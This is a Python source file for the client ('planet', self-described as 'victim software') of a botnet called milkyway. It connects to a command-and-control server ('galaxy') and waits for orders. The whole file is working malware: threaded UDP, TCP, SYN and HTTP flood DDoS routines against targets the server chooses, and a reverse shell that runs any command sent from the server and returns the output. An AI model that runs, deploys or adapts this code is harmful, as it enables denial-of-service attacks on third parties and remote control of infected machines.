#!/usr/bin/env python3

"""planet.py: The milkyway client/victim software."""

# import libraries
import multiprocessing
import os
import random
import socket
import subprocess
import sys
import time
from threading import Thread
from signal import SIGINT, signal

# get platform
if sys.platform in ("linux", "linux2"):
    planet_os = "linux"
elif sys.platform == "darwin":
    planet_os = "mac"
elif sys.platform == "win32":
    planet_os = "windows"
else:
    print("This platform is unsupported.")
    os._exit(0)


# functions
class DDoS:
    def __init__(self, target_ip, target_port, flood_type):
        self.target_ip = target_ip
        self.target_port = target_port
        if flood_type == "udp":
            self.ddos_udp()
        if flood_type == "tcp":
            self.ddos_tcp()
        if flood_type == "syn":
            self.ddos_syn()
        if flood_type == "http":
            self.ddos_http()


    def ddos_udp(self):
        """Attempt a DDoS attack on a remote host by spamming large packets of data (UDP ONLY)."""
        while planet_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((str(self.target_ip), int(self.target_port)))
                s.sendto(os.urandom(10240), (str(self.target_ip), int(self.target_port)))
                s.close()
            except IOError:
                time.sleep(1)
        if "s" in locals():
            s.close()


    def ddos_tcp(self):
        """Attempt a DDoS attack on a remote host by spamming large packets of data (TCP ONLY)."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while planet_attacking:
            try:
                s.setblocking(0)
                s.sendto(os.urandom(10240), (str(self.target_ip), int(self.target_port)))
            except IOError:
                time.sleep(1)
        if "s" in locals():
            s.close()


    def ddos_syn(self):
        """Attempt a DDoS attack on a remote host by spamming connections and disconnections."""
        while planet_attacking:
            try:
                s = socket.socket()
                s.connect((str(self.target_ip), int(self.target_port)))
                s.close()
            except IOError:
                time.sleep(1)
        if "s" in locals():
            s.close()


    def ddos_http(self):
        """Attempt a DDoS attack on a remote host by spamming HTTP GET requests."""
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        while planet_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(self.target_ip), int(self.target_port)))
                s.sendto(
                    (f"GET /{self.target_ip} HTTP/1.1\r\n").encode("ascii"),
                    (str(self.target_ip), int(self.target_port)),
                )
                s.sendto(
                    (f"Host: {src_ip} \r\n\r\n").encode("ascii"),
                    (str(self.target_ip), int(self.target_port)),
                )
                s.close()
            except IOError:
                time.sleep(1)
        if "s" in locals():
            s.close()


def exit_handler(*args):
    """Ensure a smooth and safe exit."""
    global planet_online, planet_shutting_down, planet_attacking
    planet_shutting_down = True
    if planet_online:
        planet_socket.send(f"planet ID: {planet_id} offline".encode())
    planet_online = False
    planet_attacking = False
    planet_socket.close()
    print("Exiting...")
    os._exit(0)


def connect_to_galaxy():
    """Connect to galaxy."""
    global planet_socket, planet_online
    while not planet_online:
        try:
            print("Connecting to galaxy...")
            planet_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            planet_socket.connect((galaxy_ip, galaxy_port))
            print("Successfully connected to galaxy.")
            planet_online = True
        except Exception:
            print("Cannot connect to galaxy. Retrying in 5 seconds...")
            time.sleep(5)


def shell(shell_buf_size):
    """Process incoming reverse shell commands from galaxy."""
    shell_socket = socket.socket()
    shell_socket.connect((galaxy_ip, shell_port))
    cwd = os.getcwd()
    shell_socket.send(cwd.encode())
    while not planet_shutting_down:
        shell_cmds = []
        shell_cmd = shell_socket.recv(shell_buf_size).decode()
        if shell_cmd.lower() == "exit":
            break
        if "&&" in shell_cmd and ";" not in shell_cmd:
            shell_cmds = shell_cmd.split("&&")
        elif ";" in shell_cmd and "&&" not in shell_cmd:
            shell_cmds = shell_cmd.split(";")
        elif "&&" in shell_cmd and ";" in shell_cmd:
            shell_cmds = shell_cmd.split("&&")
            for i, possible_cmd in enumerate(shell_cmds):
                if ";" in possible_cmd:
                    shell_cmds[i] = possible_cmd.split(";")
        if not shell_cmds:
            if shell_cmd[:2].lower() == "cd":
                new_shell_cmd = shell_cmd.replace("cd ", "", 1).strip()
                try:
                    os.chdir(new_shell_cmd)
                except FileNotFoundError:
                    output = f"Directory {new_shell_cmd} not found."
                else:
                    output = ""
            else:
                output = subprocess.getoutput(shell_cmd.strip())
        else:
            for shell_list_cmd in shell_cmds:
                if shell_list_cmd[:2].lower() == "cd":
                    new_shell_list_cmd = shell_list_cmd.replace("cd ", "", 1).strip()
                    try:
                        os.chdir(new_shell_list_cmd)
                    except FileNotFoundError:
                        output = f"Directory {new_shell_list_cmd} not found."
                    else:
                        output = ""
                else:
                    output = f"{output}\n{subprocess.getoutput(shell_list_cmd.strip())}"
        cwd = os.getcwd()
        message = f"{output}<sep>{cwd}"
        shell_socket.send(message.encode())
    if planet_shutting_down:
        shell_socket.send("shutting down".encode())
    shell_socket.close()


def connection_handler():
    """Handle commands coming from galaxy, and keep planet connected to galaxy."""
    global planet_online, planet_id, planet_attacking
    while not planet_shutting_down:
        while planet_online:
            try:
                data = planet_socket.recv(1024).decode("ascii").lower()
                if "ddos" in data:
                    data = data.replace("ddos ", "").strip().split()
                    if "stop" in data:
                        print("Recieved stop DDoS command.")
                        planet_attacking = False
                        continue
                    else:
                        print("Recieved DDoS command.")
                    target_ip, target_port, flood_type = data
                    attack_thread_count = int(planet_threads) - 1
                    if attack_thread_count == 0:
                        attack_thread_count = 1
                    planet_attacking = True
                    for _ in range(attack_thread_count):
                        Thread(target=DDoS, args=(target_ip, target_port, flood_type)).start()
                    planet_socket.send(f"planet ID: {planet_id} attacking".encode())
                    print(
                        f"Attacking! (IP: {target_ip} | Port: {target_port} | Type: {flood_type})"
                    )
                elif "planet ID: " in data:
                    planet_id = data.replace("planet ID: ", "").strip()
                    print(f"Recieved planet ID: {planet_id}")
                    print(data)
                elif "shellcmd start bufsize " in data:
                    planet_socket.send(f"planet ID: {planet_id} shelled".encode())
                    shell(int(data.replace("shellcmd start bufsize ", "").strip()))
                elif not data:
                    print("Having trouble connecting to galaxy, attempting to reconnect...")
                    planet_online = False
                    connect_to_galaxy()
            except IOError as e:
                print("Having trouble connecting to galaxy, attempting to reconnect...")
                print(f"Error: {e}")
                planet_online = False
                connect_to_galaxy()
            time.sleep(1)
        planet_attacking = False


# exit handler
signal(SIGINT, exit_handler)


# variables
galaxy_ip = "127.0.0.1"
galaxy_port = 9999
shell_port = 10000
planet_threads = multiprocessing.cpu_count()
planet_id = ""
planet_attacking = False
planet_online = False
planet_shutting_down = False
planet_socket = ""

# connect to galaxy
connect_to_galaxy()
Thread(target=connection_handler).start()
